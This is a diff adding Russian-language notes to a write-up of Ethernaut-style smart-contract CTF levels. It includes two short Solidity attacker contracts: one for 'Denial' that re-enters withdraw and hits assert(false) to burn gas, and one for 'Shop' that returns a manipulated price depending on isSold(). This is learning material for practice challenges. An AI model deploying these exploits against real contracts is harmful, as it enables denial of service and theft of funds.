@@ -336,13 +336,49 @@ object "Contract" {
   ```
 
 ### 19. Alien Codex (****)
+Предположение №1 - адрес владельца контракта чисто случайно лежит в ячейке с адресом codex[05] - нет(
 
 
 ### 20. Denial (***)
+Чет вторая задача с которой с первого раза не справился. Хм... Пришло время думать :/
+Короче надо сделать так, чтобы вызов call забирал весь свободный газ. Или больше 1 млн
+Как вариант - круговой вызов, да еще и assert(false)
+```
+contract Wilys {
+    Denial denial;
+    constructor(address payable a) {
+        denial = Denial(a);
+    }
 
+    receive() external payable { 
+        denial.withdraw();
+        assert(false);
+    }
+}
+```
 
 ### 21. Shop (**)
+После предыдущей задачи это просто. Снова нужен контракт, а в контракте в зависимости от флага покупки подставляю цену больше или меньше от прайса. Easy - я э говорил)
+```
+contract Buyer {
+    Shop shop;
+    constructor(address a) {
+        shop = Shop(a);
+    }
 
+    function buy() external {
+        shop.buy();
+    }
+
+    function price() external view returns (uint) {
+        if(shop.isSold() == false) {
+            return shop.price() + 10;
+        } else {
+            return shop.price() - 10;
+        }
+    }
+}
+```
 
 ### 22. Dex (**)
 
